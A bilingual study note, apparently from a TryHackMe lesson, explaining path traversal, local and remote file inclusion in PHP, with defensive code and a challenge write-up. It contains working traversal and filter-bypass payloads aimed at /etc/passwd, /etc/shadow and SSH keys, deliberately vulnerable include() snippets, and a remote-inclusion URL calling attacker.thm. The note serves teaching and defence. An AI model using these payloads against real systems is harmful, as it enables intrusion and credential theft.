- Ở đây đã bao gồm tất cả lý thuyết cơ bản của LFI và RFI

# I/Introduction

**-Purpose of the Topic**

+The material is designed to teach:

- File inclusion vulnerability concepts
- Exploitation techniques
- Security risks
- Required remediation methods
- Practical examples
- Hands-on challenges

+It focuses on three primary vulnerability types:

- **Local File Inclusion (LFI)**
- **Remote File Inclusion (RFI)**
- **Directory Traversal**

**-How Web Applications Access Files**

+Many web applications are built to retrieve files dynamically from a system.

+Examples of requested files include:

- Images
- Static text files
- PDFs
- User-uploaded documents

+This is often achieved using **URL parameters**.

**-What Parameters Are**

+Parameters are:

- Query strings attached to URLs
- Used to pass user input to the server
- Used to request data or trigger actions

+They allow web applications to process user requests dynamically.

**-Example of Parameter Usage**

+A common example is a search query:

https://www.google.com/search?q=TryHackMe

+Here:

- q is the parameter
- TryHackMe is the user-supplied input

+This demonstrates how GET requests transmit data through URLs.

**-File Access Example**

+A vulnerable file retrieval request may look like:

[http://webapp.thm/get.php?file=userCV.pdf](http://webapp.thm/get.php?file=userCV.pdf)

![Lesson 6 File Inclusion](<02-Techniques/Web/File%20Inclusion/Attachments/Lesson%206%20File%20Inclusion.png>)

+In this request:

- file is the parameter
- userCV.pdf is the requested file

The server processes this input to locate and display the file.

**-Example Scenario**

![Lesson 6 File Inclusion](<02-Techniques/Web/File%20Inclusion/Attachments/Lesson%206%20File%20Inclusion%201.png>)

-The content presents a case where:

- A user wants to access their CV through a web application
- The application uses the file parameter to determine which document to display

+This functionality is legitimate when properly secured.

**-Why File Inclusion Vulnerabilities Happen**

+The primary cause is **poor input validation**.

+Specifically:

- User input is not sanitized
- Input is not validated
- Users have direct control over file references

+Because of this, attackers can manipulate input values.

**-Programming Languages Affected**

+The content notes that these vulnerabilities are commonly found in:

- Web applications written in **PHP**

+More broadly, they can occur in any language if file access is poorly implemented.

**-Root Security Problem**

+The underlying issue is that the application trusts user input too much.

Without validation, users can pass:

- Arbitrary file names
- Unexpected paths
- Malicious file references

+This creates opportunities for exploitation.

**-Risks of File Inclusion Vulnerabilities**

**A. Data Leakage**

Attackers may read sensitive files such as:

- Application source code
- Credentials
- Configuration files
- Operating system files

**-Exposure of Sensitive System Information**

Attackers may access files related to:

- The web application
- The underlying operating system

This can reveal information useful for further attacks.

**-Remote Command Execution (RCE)**

If an attacker can write files to the server through another vulnerability or feature:

File inclusion can be chained with that capability to achieve:

- **Remote Code Execution**

This allows execution of arbitrary commands on the target server.

**-Severity Escalation**

The impact can progress from:

1. File disclosure
2. Credential theft
3. System reconnaissance
4. Remote code execution

This makes file inclusion vulnerabilities highly dangerous.

# II/Path Traversal

## **1. What is Path Traversal?**

- Also known as Directory traversal
- Allows an attacker to **read operating system resources** (local files) on the server.
- Achieved by **manipulating URL parameters** to access files outside the application's root directory.
- Also known as the **"dot-dot-slash attack"** (../).
- Root cause: **poor input validation/filtering** of user-supplied input passed to file-reading functions (e.g., PHP's file_get_contents()).

## **2. How It Works**

- Normal flow: app serves files from its defined path, e.g. /var/www/app/CVs/userCV.pdf.

![Lesson 6 File Inclusion](<02-Techniques/Web/File%20Inclusion/Attachments/Lesson%206%20File%20Inclusion%202.png>)

- Attacker finds a file parameter entry point, e.g. get.php?file=.
- Injects ../ sequences to **climb up directories** one level at a time until reaching the root /.
- Then navigates into sensitive directories to read target files.

![Lesson 6 File Inclusion](<02-Techniques/Web/File%20Inclusion/Attachments/Lesson%206%20File%20Inclusion%203.png>)

**Example Attack URL (Linux):**

[http://webapp.thm/get.php?file=../../../../etc/passwd](http://webapp.thm/get.php?file=../../../../etc/passwd)

![Lesson 6 File Inclusion](<02-Techniques/Web/File%20Inclusion/Attachments/Lesson%206%20File%20Inclusion%204.png>)

- Each ../ moves one directory up from /var/www/app/CVs.
- Eventually reaches root /, then navigates to /etc/passwd.
- The server **returns the file contents** to the attacker.

## **3. Path Traversal on Windows Servers**

- Same concept applies but uses **Windows-style paths**.

http://webapp.thm/get.php?file=../../../../boot.ini

http://webapp.thm/get.php?file=../../../../windows/win.ini

- Climbs directories until reaching the Windows root drive (typically C:\).

## **4. Common Target Files for Testing**

_Linux:_

|**File Path**|**Description**|
|---|---|
|/etc/issue|System identification message shown before login prompt|
|/etc/profile|System-wide default variables (umask, terminal types, etc.)|
|/proc/version|Linux kernel version|
|/etc/passwd|All registered users with system access|
|/etc/shadow|Users' hashed password information|
|/root/.bash_history|Command history for the root user|
|/var/log/dmessage|Global system messages including startup logs|
|/var/mail/root|All emails for the root user|
|/root/.ssh/id_rsa|Private SSH keys for root or valid users|
|/var/log/apache2/access.log|Apache web server access requests log|

_Windows:_

|**File Path**|**Description**|
|---|---|
|C:\boot.ini|Boot options for computers with BIOS firmware|

# III/Local File Inclusion(LFI)

## 1/LFI-Basics

### a/Method Attack

**🔍 What is LFI?**

- Occurs when a web application **includes files based on user-supplied input** without properly validating or sanitizing it.
- Follows the same concepts as **path traversal attacks**.
- Can expose **sensitive server files** such as /etc/passwd (Linux user information).
- Caused primarily by **lack of input validation** in file inclusion functions.

**⚠️ Vulnerable PHP Functions**

```php

include()

require()

include_once()

require_once()
```

**🔵 Scenario 1: No Directory Specified**

**Vulnerable code:**

php

```php
<?php

include($_GET["lang"]);

?>
```

**Normal usage:**

http://webapp.thm/index.php?lang=EN.php → Loads English page

http://webapp.thm/index.php?lang=AR.php → Loads Arabic page

**Exploitation:**

http://webapp.thm/get.php?file=/etc/passwd

**Why it works:**

- No directory is specified in the include function
- No input validation exists
- Attacker can supply **any file path** directly as the parameter value
- Server reads and displays the requested file

**🟡 Scenario 2: Directory Specified — Path Traversal Bypass**

**Vulnerable code:**

```php

**<?PHP**

include("languages/". $_GET['lang']);

**?>**
```

**Developer's intention:**

- Restrict file inclusion to the languages/ directory only
- Normal usage: ?lang=EN.php → loads languages/EN.php

**Exploitation using path traversal (../):**

http://webapp.thm/index.php?lang=../../../../etc/passwd

**How the path resolves:**

languages/../../../../etc/passwd

│

└── Each "../" moves one directory up:

languages/ → web root → var → → / (root)

Final path: /etc/passwd ✅

**Why it works:**

- No input validation on the lang parameter
- ../ sequences navigate **up and out** of the intended directory
- The include function then loads the sensitive file into the current page

**📋 Key Differences Between Scenarios**

|**Aspect**|**Scenario 1**|**Scenario 2**|
|---|---|---|
|**Directory restriction**|❌ None|⚠️ Attempted (languages/)|
|**Input validation**|❌ None|❌ None|
|**Exploit method**|Direct path|Path traversal (../)|
|**Example payload**|/etc/passwd|../../../../etc/passwd|
|**Security level**|Very Low|Slightly higher but still vulnerable|

**🎯 Common Target Files via LFI**

|**File**|**Contents**|
|---|---|
|/etc/passwd|Linux user account information|
|/etc/shadow|Hashed user passwords|
|/etc/hosts|Local DNS mappings|
|C:\windows\system32\drivers\etc\hosts|Windows equivalent|

### b/Method Defense

**🛡️ Tổng Quan Các Lớp Phòng Thủ**

```
ATTACKER

│

│ ?lang=../../../../etc/passwd

▼

┌─────────────────────┐

│ LỚP 1: INPUT │ ← Lọc đầu vào người dùng

│ VALIDATION │

└─────────────────────┘

│ Vượt qua lớp 1?

▼

┌─────────────────────┐

│ LỚP 2: WHITELIST │ ← Chỉ cho phép file được phép

└─────────────────────┘

│ Vượt qua lớp 2?

▼

┌─────────────────────┐

│ LỚP 3: FILE SYSTEM │ ← Giới hạn quyền truy cập

│ PERMISSIONS │

└─────────────────────┘

│ Vượt qua lớp 3?

▼

┌─────────────────────┐

│ LỚP 4: SERVER │ ← Cấu hình server an toàn

│ CONFIGURATION │

└─────────────────────┘

│

▼

❌ ATTACK FAILED
```

**🔵 Phòng Thủ 1: Input Validation (Quan Trọng Nhất)**

**Xóa ký tự nguy hiểm**

```php

// ❌ CODE DỄ BỊ TẤN CÔNG

include($_GET['lang']);

// ✅ CODE AN TOÀN HƠN

$lang = $_GET['lang'];

// Xóa path traversal sequences

$lang = str_replace('../', '', $lang);

$lang = str_replace('..\\', '', $lang);

// Chỉ cho phép chữ cái và số

$lang = preg_replace('/[^a-zA-Z0-9]/', '', $lang);

include("languages/" . $lang . ".php");
```

**Kiểm tra ký tự null byte**

```php

// Null byte (%00) có thể bypass validation

// Ví dụ tấn công: ?lang=../../../../etc/passwd%00

$lang = str_replace('\0', '', $_GET['lang']); // Xóa null bytes
```

**🟡 Phòng Thủ 2: Whitelist (Hiệu Quả Nhất)**

```php

// ✅ CHỈ CHO PHÉP NHỮNG FILE CỤ THỂ

$allowed_files = ['EN', 'AR', 'FR', 'DE'];

$lang = $_GET['lang'];

if (in_array($lang, $allowed_files)) {

include("languages/" . $lang . ".php");

} else {

// Từ chối và ghi log

http_response_code(400);

die("Invalid language selection.");

}
```

💡 **Whitelist = Danh sách trắng** — Chỉ cho phép những giá trị **đã được xác định trước**, từ chối tất cả những gì khác.

**🟢 Phòng Thủ 3: Basename() Function**

```php

// basename() chỉ lấy tên file, loại bỏ toàn bộ đường dẫn

// Ví dụ: basename("../../../../etc/passwd") = "passwd"

$lang = basename($_GET['lang']);

include("languages/" . $lang . ".php");

// Kết quả:

// Tấn công: ?lang=../../../../etc/passwd

// Sau basename(): "passwd"

// File tìm kiếm: languages/passwd.php → KHÔNG TỒN TẠI ✅
```
**🔴 Phòng Thủ 4: File System Permissions**

```bash

# Giới hạn quyền của web server

# Web server chỉ nên đọc được thư mục cần thiết

# Cấp quyền chỉ đọc cho thư mục web

chmod 755 /var/www/html/

chmod 644 /var/www/html/*.php

# KHÔNG cho web server đọc file nhạy cảm

chmod 600 /etc/passwd

chmod 600 /etc/shadow

# Chạy web server với user có quyền hạn thấp nhất

# Thay vì root → dùng www-data
```
**🟣 Phòng Thủ 5: PHP Configuration (php.ini)**

```ini

; Vô hiệu hóa cho phép include file từ URL bên ngoài

allow_url_include = Off

allow_url_fopen = Off

; Giới hạn PHP chỉ hoạt động trong thư mục cụ thể

open_basedir = /var/www/html/

; Tắt hiển thị lỗi (tránh lộ thông tin hệ thống)

display_errors = Off

log_errors = On

error_log = /var/log/php_errors.log
```

**⚫ Phòng Thủ 6: Web Application Firewall (WAF)**

```
REQUEST: ?lang=../../../../etc/passwd

│

▼

┌──────────┐

│ WAF │ ← Phát hiện pattern tấn công

└──────────┘

│

┌──────────┐

│ BLOCK │ ← Chặn request độc hại

└──────────┘

│

▼

❌ 403 FORBIDDEN

Các WAF phổ biến:

- **ModSecurity** (Apache/Nginx)
- **Cloudflare WAF**
- **AWS WAF**
```
**📊 Tổng Hợp Các Biện Pháp Phòng Thủ**

|**Biện Pháp**|**Hiệu Quả**|**Độ Khó Triển Khai**|**Ghi Chú**|
|---|---|---|---|
|**Input Validation**|⭐⭐⭐⭐|Dễ|Luôn làm đầu tiên|
|**Whitelist**|⭐⭐⭐⭐⭐|Dễ|Hiệu quả nhất|
|**basename()**|⭐⭐⭐|Rất dễ|Kết hợp với biện pháp khác|
|**File Permissions**|⭐⭐⭐⭐|Trung bình|Quan trọng ở tầng OS|
|**PHP Configuration**|⭐⭐⭐⭐|Dễ|Cấu hình một lần|
|**WAF**|⭐⭐⭐|Khó|Lớp bảo vệ bổ sung|

**✅ Code Hoàn Chỉnh — Kết Hợp Tất Cả Biện Pháp**

```php
<?php

// 1. Whitelist các file được phép

$allowed = ['EN', 'AR', 'FR'];

// 2. Lấy input từ người dùng

$lang = $_GET['lang'] ?? 'EN'; // Mặc định là EN nếu không có

// 3. Xóa ký tự nguy hiểm

$lang = basename($lang); // Xóa path traversal

$lang = preg_replace('/[^a-zA-Z]/', '', $lang); // Chỉ giữ chữ cái

$lang = strtoupper($lang); // Chuẩn hóa

// 4. Kiểm tra whitelist

if (!in_array($lang, $allowed)) {

http_response_code(400);

die("Invalid language.");

}

// 5. Tạo đường dẫn file an toàn

$file = "languages/" . $lang . ".php";

// 6. Kiểm tra file tồn tại trước khi include

if (file_exists($file)) {

include($file);

} else {

die("Language file not found.");

}?>
```


**💡 Quy Tắc Vàng**

1. **Đừng bao giờ tin tưởng input từ người dùng** — luôn validate và sanitize
2. **Dùng Whitelist thay vì Blacklist** — cho phép cái biết an toàn, chặn tất cả còn lại
3. **Defense in Depth** — dùng nhiều lớp bảo vệ, không phụ thuộc vào một biện pháp duy nhất
4. **Principle of Least Privilege** — web server chỉ có quyền tối thiểu cần thiết

## 2/LFI-Advance

-In this part, We discussed a couple of techniques to bypass the filter within the include function.

### a/Method Attack

**🔵 Scenario 3: Black Box Testing + Null Byte Bypass**

**Context:** No source code available — must rely on **error messages** for information.

**Step 1 — Information Gathering via Error Messages:**

Input: ?lang=THM

Error: include(languages/THM.php): failed to open stream...

in /var/www/html/THM-4/index.php on line 12

Two critical pieces of information revealed:

- The app **appends .php** automatically to all input
- The **full server path** is /var/www/html/THM-4/ (4 directory levels)

**Step 2 — Path Traversal Attempt:**

http://webapp.thm/index.php?lang=../../../../etc/passwd

Result: Still fails because .php is appended → etc/passwd.php

**Step 3 — Null Byte Bypass (%00):**

http://webapp.thm/index.php?lang=../../../../etc/passwd%00

How it works:

```
include("languages/../../../../etc/passwd%00".".php")

↑

Null byte terminates string here

= include("languages/../../../../etc/passwd") ✅
```

⚠️ **Important:** The %00 null byte trick only works on **PHP versions below 5.3.4** — it is patched in newer versions.

**🟡 Scenario 4: Keyword Filter Bypass**

**Context:** Developer filters the /etc/passwd keyword specifically.

**Two bypass methods:**

|**Method**|**Payload**|**How It Works**|
|---|---|---|
|**Null Byte**|/etc/passwd%00|Terminates string before filter can act|
|**Current Directory Trick**|/etc/passwd/.|/etc/passwd/. resolves to /etc/passwd|

**Understanding the dot trick:**

cd .. → Moves UP one directory

cd . → STAYS in current directory

/etc/passwd/.. → Resolves to /etc/ ❌ (goes up)

/etc/passwd/. → Resolves to /etc/passwd ✅ (stays)

**🟢 Scenario 5: Path Traversal Stripping Bypass**

**Context:** Developer strips ../ sequences from input, replacing them with empty strings.

**Failed attempt:**

Input: ../../../../etc/passwd

Result: include(languages/etc/passwd) ← ../ removed

**Bypass using nested traversal sequences (....//):**

Payload: ....//....//....//....//....//etc/passwd

**Why it works:**

Original: ....//....//....//

↑↑↑↑

PHP strips first ../ → ../

Result after filter: ../../../../etc/passwd ✅

- The filter only scans for ../ **once** without re-checking
- Embedding ../ inside ....// means after stripping, a valid ../ remains

**🔴 Scenario 6: Forced Directory Prefix Bypass**

**Context:** Developer forces input to **include a specific directory** in the path.

**Normal usage:**

http://webapp.thm/index.php?lang=languages/EN.php

**Exploitation — include required directory then traverse out:**

?lang=languages/../../../../../etc/passwd

**How the path resolves:**

languages/../../../../../etc/passwd

│

└── languages/ → (back to web root via ../) → /etc/passwd ✅

- The required directory prefix is included to **satisfy the filter**
- Then ../ sequences navigate **out of that directory** to reach the target file

**📊 Summary of All Bypass Techniques**

|**Scenario**|**Defense Used**|**Bypass Technique**|**Example Payload**|
|---|---|---|---|
|**#3**|.php auto-appended|Null Byte (%00)|../../../../etc/passwd%00|
|**#4**|Keyword filtering|Null Byte or /./ trick|/etc/passwd/.|
|**#5**|../ stripping|Nested traversal (....//)|....//....//etc/passwd|
|**#6**|Forced directory prefix|Include prefix + traverse out|languages/../../../../../etc/passwd|

### b/Method Defense

**1. Defense Tổng Thể (Quan trọng nhất)**

|**Biện pháp**|**Mức độ**|**Ghi chú**|
|---|---|---|
|**Không dùng include($_GET['lang'])**|★★★★★|Đây là nguyên nhân gốc rễ|
|**Whitelist (cho phép danh sách)**|★★★★★|Cách defense mạnh nhất|
|**Chặn tất cả ký tự nguy hiểm**|★★★★|Phải làm kỹ|

**2. Defense Chi Tiết Theo Từng Scenario**

**Scenario 3: Null Byte + .php append**

**Defense:**

```PHP

// Cách 1: Whitelist (Tốt nhất)

$allowed = ['en', 'vi', 'th', 'fr'];

$lang = $_GET['lang'] ?? 'en';

if (!in_array($lang, $allowed)) {

die('Language not allowed');

}

include "languages/{$lang}.php"; // an toàn
```

**Cách 2: Làm sạch input mạnh**

```PHP

$lang = basename($_GET['lang']); // chỉ lấy tên file

$lang = preg_replace('/[^a-zA-Z0-9_-]/', '', $lang); // chỉ cho phép chữ, số, _, -
```
**Scenario 4 & 5: Keyword Filter + ../ Stripping**

**Defense tốt:**

```PHP

function safe_include($file) {

$file = str_replace(['../', '..\\', '%00', '\0', './'], '', $file); // strip 1 lần chưa đủ

// Strip nhiều lần

while (strpos($file, '../') !== false || strpos($file, '..\\') !== false) {

$file = str_replace(['../', '..\\'], '', $file);

}

// Kiểm tra path traversal còn lại không

if (strpos($file, '..') !== false || strpos($file, '/') === 0 || strpos($file, '\\') === 0) {

die('Access denied');

}

$fullpath = "languages/" . $file . ".php";

// Kiểm tra file có thật sự nằm trong thư mục languages không

$realpath = realpath($fullpath);

$basedir = realpath('languages/');

if ($realpath === false || strpos($realpath, $basedir) !== 0) {

die('Access denied - Path traversal detected');

}

include $realpath;

}
```

**Scenario 6: Forced Directory Prefix Bypass**

**Defense mạnh:**

```
PHP

$base_dir = realpath('languages/'); // Lấy đường dẫn thật

$lang = $_GET['lang'] ?? 'en';

$filepath = $base_dir . '/' . basename($lang) . '.php';

if (file_exists($filepath) && strpos($filepath, $base_dir) === 0) {

include $filepath;

} else {

include $base_dir . '/en.php';

}
```

# IV/Remote File Inclusion - RFI

## 1/Method attack

**🔍 What is RFI?**

- A technique that allows attackers to **include remote files** from an external server into a vulnerable web application.
- Occurs when **user input is not properly sanitized** before being passed to file inclusion functions (e.g., include()).
- **Key requirement:** The PHP configuration option allow_url_fopen must be **enabled** on the target server.

**⚠️ Why RFI is More Dangerous than LFI**

|**Aspect**|**LFI**|**RFI**|
|---|---|---|
|**File source**|Local server files|Remote external files|
|**Code execution**|Limited|Full Remote Command Execution (RCE)|
|**Attack control**|Read existing files|Inject and run custom malicious code|
|**Risk level**|High|**Critical**|

**💥 Consequences of a Successful RFI Attack**

- **Remote Command Execution (RCE)** — attacker can run arbitrary commands on the server
- **Sensitive Information Disclosure** — access to confidential server data
- **Cross-Site Scripting (XSS)** — inject malicious scripts affecting users
- **Denial of Service (DoS)** — disrupt or crash the target application

**🔄 How an RFI Attack Works — Step by Step**

![Lesson 6 File Inclusion](<02-Techniques/Web/File%20Inclusion/Attachments/Lesson%206%20File%20Inclusion%205.png>)

```
ATTACKER SERVER TARGET SERVER

(attacker.thm) (webapp.thm)

│ │

│ 1. Host malicious file │

│ cmd.txt contains: │

│ <?PHP echo "Hello THM"; ?> │

│ │

│ 2. Inject malicious URL │

│─────────────────────────────────►│

│ ?lang=http://attacker.thm/cmd.txt

│ │

│ │ 3. No input validation

│ │ URL passed to include()

│ │

│◄─────────────────────────────────│

│ 4. Target sends GET request │

│ to fetch cmd.txt │

│ │

│─────────────────────────────────►│

│ 5. Malicious file sent back │

│ │

│ │ 6. Target executes

│ │ PHP code from

│ │ attacker's file

│◄─────────────────────────────────│

│ 7. Result returned to attacker │

│ "Hello THM" displayed │
```
**Exploit URL:**

http://webapp.thm/index.php?lang=http://attacker.thm/cmd.txt

**Malicious file hosted on attacker's server (cmd.txt):**

```php

**<?PHP** echo "Hello THM"; **?>**
```
**What happens internally on the target server:**

```php

// Vulnerable code

include($_GET['lang']);

// After injection becomes:

include("http://attacker.thm/cmd.txt");

// → Fetches and EXECUTES the remote PHP file ✅
```

**🔑 Key Requirements for RFI to Work**

|**Requirement**|**Detail**|
|---|---|
|**No input validation**|User-supplied URLs must reach the include() function unfiltered|
|**allow_url_fopen = On**|PHP must be configured to allow remote file fetching|
|**allow_url_include = On**|PHP must allow including remote URLs|
|**Attacker-controlled server**|Attacker must host the malicious file on an accessible server|

**🆚 RFI vs LFI — Quick Comparison**

|                           | **LFI**              | **RFI**                    |
| ------------------------- | -------------------- | -------------------------- |
| **File location**         | Local server         | Remote server              |
| **Requires network**      | ❌ No                | ✅ Yes                     |
| **Custom code injection** | ❌ Limited           | ✅ Full control            |
| **Worst case outcome**    | Read sensitive files | Full server takeover (RCE) |
| **PHP requirement**       | None special         | allow_url_fopen = On       |

## 2/Method Defense

**1. Defense Quan Trọng Nhất (Kill RFI)**

|**Biện pháp**|**Hiệu quả**|**Ghi chú**|
|---|---|---|
|**Tắt allow_url_include**|★★★★★|Đây là cách mạnh nhất|
|**Tắt allow_url_fopen**|★★★★☆|Rất quan trọng|
|**Whitelist** cho input|★★★★★|Khuyến nghị cao|
|**Không dùng include() với input người dùng**|★★★★★|Nguyên nhân gốc|

**2. Cách Triển Khai Defense RFI**

**Cách 1: Tắt cấu hình nguy hiểm (PHP.ini)**

```ini

; Tắt hoàn toàn RFI

allow_url_include = Off

allow_url_fopen = Off

; Tắt một số hàm nguy hiểm

disable_functions = exec, shell_exec, system, passthru, popen, curl_exec, curl_multi_exec, proc_open
```

Sau khi sửa thì **restart Apache**:

```Bash

sudo systemctl restart apache2
```

Đây là biện pháp phòng thủ mạnh nhất. Hầu hết RFI sẽ thất bại nếu 2 option trên bị tắt.

**Cách 2: Code Defense (PHP)**

**Code an toàn nhất (Whitelist):**

```PHP

<?php

// Danh sách ngôn ngữ / file được phép

$allowed = ['en', 'vi', 'th', 'fr', 'de'];

$lang = $_GET['lang'] ?? 'en';

// Kiểm tra whitelist

if (!in_array($lang, $allowed)) {

$lang = 'en'; // fallback

}

// Đường dẫn cố định, không cho phép URL

include "languages/" . $lang . ".php";

**Code Defense Nâng Cao (Sử dụng realpath + kiểm tra protocol):**

PHP

function safeInclude($file) {

// Chặn mọi URL (http, https, ftp, php://, data://...)

if (preg_match('/^(http|https|ftp|php|data|file):\/\//i', $file)) {

die('Remote file inclusion is not allowed!');

}

// Chỉ cho phép chữ, số, dấu gạch ngang và gạch dưới

$file = preg_replace('/[^a-zA-Z0-9_-]/', '', $file);

$filepath = "languages/" . $file . ".php";

$realpath = realpath($filepath);

if ($realpath === false) {

die('File not found');

}

// Kiểm tra file có nằm trong thư mục languages không

$baseDir = realpath('languages/');

if (strpos($realpath, $baseDir) !== 0) {

die('Access denied');

}

include $realpath;

}

// Sử dụng

safeInclude($_GET['lang'] ?? 'en');

**3. Các Biện Pháp Khác**

- **Sử dụng basename()**:

PHP

$lang = basename($_GET['lang']); // Loại bỏ mọi đường dẫn và protocol

- **Tắt error reporting** ở production (không để lộ đường dẫn):

PHP

error_reporting(0);

ini_set('display_errors', 0);
```

- **Sử dụng Framework**: Laravel, Symfony, CodeIgniter… đã có cơ chế bảo vệ sẵn tốt hơn rất nhiều.
- **Web Application Firewall (WAF)**: ModSecurity + OWASP CRS rule set.

**Tóm tắt Defense RFI (Nên làm theo thứ tự)**

1. **Tắt allow_url_include = Off** trong php.ini (Quan trọng nhất)
2. Dùng **Whitelist** thay vì Blacklist
3. Không bao giờ truyền trực tiếp $_GET, $_POST vào include(), require()
4. Kiểm tra protocol (http/https) và dùng realpath()
5. Cập nhật PHP lên phiên bản mới nhất
6. Chạy web server với quyền thấp (www-data)

# V/Remediation(Khắc phục hậu quả)

-As a developer, it's important to be aware of web application vulnerabilities, how to find them, and prevention methods. To prevent the file inclusion vulnerabilities, some common suggestions include:

1. Keep system and services, including web application frameworks, updated with the latest version.
2. Turn off PHP errors to avoid leaking the path of the application and other potentially revealing information.
3. A Web Application Firewall (WAF) is a good option to help mitigate web application attacks.
4. Disable some PHP features that cause file inclusion vulnerabilities if your web app doesn't need them, such as allow_url_fopen on and allow_url_include.
5. Carefully analyze the web application and allow only protocols and PHP wrappers that are in need.
6. Never trust user input, and make sure to implement proper input validation against file inclusion.
7. Implement whitelisting for file names and locations as well as blacklisting.

# VI/Challenge(How to pentest a system black box be LFI)

Steps for testing for LFI

1. Find an entry point that could be via GET, POST, COOKIE, or HTTP header values!
2. Enter a valid input to see how the web server behaves.
3. Enter invalid inputs, including special characters and common file names.
4. Don't always trust what you supply in input forms is what you intended! Use either a browser address bar or a tool such as Burpsuite.
5. Look for errors while entering invalid input to disclose the current path of the web application; if there are no errors, then trial and error might be your best option.
6. Understand the input validation and if there are any filters!
7. Try the inject a valid entry to read sensitive files

-Solve giải challenge 3:

*Note: Cách để xác định xem web có sử dụng $_REQUEST không:

**$_REQUEST Là Gì?**

```php

// $_REQUEST trong PHP thu thập dữ liệu từ:

$_REQUEST = $_GET + $_POST + $_COOKIE

// Nghĩa là nó chấp nhận input từ TẤT CẢ các nguồn
```
**🔍 Các Phương Pháp Phát Hiện**

**🔵 Phương Pháp 1: Xem Page Source**

Chuột phải → View Page Source → Tìm kiếm (Ctrl+F):

Tìm các dấu hiệu sau:

```html

<!-- Tìm form method -->

<form method="GET" action="...">

<form method="POST" action="...">

<!-- Nếu form không có method → mặc định là GET → có thể dùng $_REQUEST -->

<form action="process.php">
```

**🟡 Phương Pháp 2: Thử Chuyển Đổi GET ↔ POST**

Nếu website dùng $_REQUEST, nó sẽ chấp nhận **cả GET lẫn POST**:

bash

## Bước 1: Thử gửi parameter qua URL (GET)

http://example.com/page.php?name=test

## Bước 2: Nếu hoạt động, thử gửi qua POST

curl -X POST http://example.com/page.php -d "name=test"

-->Nếu CẢ HAI đều hoạt động → CÓ THỂ đang dùng $_REQUEST

**🟢 Phương Pháp 3: Dùng Developer Tools → Network Tab**

1. Mở DevTools (F12) → Network Tab

2. Điền form và submit

3. Click vào request → xem Headers

Dấu hiệu:

```
┌─────────────────────────────┐

│ Request Method: POST │

│ ... │

│ Form Data: username=test │

└─────────────────────────────┘
```

→ Thử thêm parameter vào URL:

http://example.com/login.php?username=test

→ Nếu server phản hồi giống nhau → dùng $_REQUEST

**🔴 Phương Pháp 4: Error-Based Detection (Black Box)**

Thử inject giá trị lạ vào URL:

http://example.com/page.php?lang=TESTVALUE123

Nếu xuất hiện lỗi PHP như:

```
┌────────────────────────────────────────────────┐

│ Warning: include(TESTVALUE123.php): failed... │

│ in /var/www/html/index.php on line 12 │

└────────────────────────────────────────────────┘
```

→ Xác nhận input từ URL (GET) đang được xử lý

→ Thử lại với POST để xem có cùng kết quả không

**🟣 Phương Pháp 5: Dùng Burp Suite**

1. Bật Burp Suite → Intercept Request

2. Gửi request bình thường

3. Trong Burp → Click chuột phải → "Change Request Method"

Ví dụ:

```
┌─────────────────────────────────────┐

│ GET /page.php?lang=EN HTTP/1.1 │ ← Original

│ Host: example.com │

└─────────────────────────────────────┘

↓ Đổi thành POST

┌─────────────────────────────────────┐

│ POST /page.php HTTP/1.1 │

│ Host: example.com │

│ │

│ lang=EN │ ← Body

└─────────────────────────────────────┘
```

So sánh response:

├── Giống nhau → CÓ THỂ dùng $_REQUEST hoặc cả $_GET lẫn $_POST

└── Khác nhau → Chỉ dùng một trong hai

**⚫ Phương Pháp 6: Cookie Injection Test**

Vì $_REQUEST cũng nhận từ $_COOKIE:

```bash

# Thử gửi parameter qua Cookie

curl -H "Cookie: lang=EN" http://example.com/page.php

# Nếu phản hồi giống với ?lang=EN → XÁC NHẬN dùng $_REQUEST
```

**📊 Bảng Tóm Tắt Dấu Hiệu Nhận Biết**

| **Dấu Hiệu**                            | **Khả Năng Dùng $_REQUEST** |
| --------------------------------------- | --------------------------- |
| Form không có method attribute          | ⭐⭐⭐ Cao                  |
| GET và POST cho kết quả giống nhau      | ⭐⭐⭐⭐ Rất cao            |
| Cookie parameter hoạt động như GET/POST | ⭐⭐⭐⭐⭐ Xác nhận         |
| Error message hiện $_REQUEST trong code | ⭐⭐⭐⭐⭐ Chắc chắn        |

**🔄 Quy Trình Kiểm Tra Nhanh**

```
BẮT ĐẦU

│

▼

[1] Xem Page Source → Tìm form method

│

▼

[2] Thử GET: ?param=value → Có phản hồi?

│ ├── Không → Không dùng GET

│ └── Có ↓

▼

[3] Thử POST với cùng param → Có phản hồi giống không?

│ ├── Không → Dùng $_GET hoặc $_POST riêng lẻ

│ └── Có ↓

▼

[4] Thử Cookie với cùng param → Có phản hồi giống không?

│ ├── Không → Dùng $_GET + $_POST (không phải $_REQUEST)

│ └── Có ↓

▼

✅ XÁC NHẬN: Website đang dùng $_REQUEST
```

**💡 Lưu Ý Quan Trọng**

- $_REQUEST không phải lúc nào cũng là lỗ hổng — nhưng nó **mở rộng bề mặt tấn công** vì chấp nhận input từ nhiều nguồn hơn.
- Luôn kiểm tra trong môi trường **được phép** — unauthorized testing là bất hợp pháp.
- Kết hợp nhiều phương pháp để có kết quả **chính xác nhất**.

*Lý do cần biết lý thuyết trên là vì:  
+Trong challenge này khi chúng ta dùng get ở form
![](Attachments/Lesson%206%20File%20Inclusion%206.png)


+Tất cả path traversal đều không được vì nó đã bị filter theo get vì vậy ta cần 1 đường tấn công khác thì với $_REQUEST ở trên chúng ta thử với POST ở form thì thành công vì nó cho phép nhiều kiểu input vào và web vẫn chưa filter với dạng post

![](Attachments/Lesson%206%20File%20Inclusion%207.png)

+Điều này chỉ chúng ta biết về các bề mặt tấn công mới trên php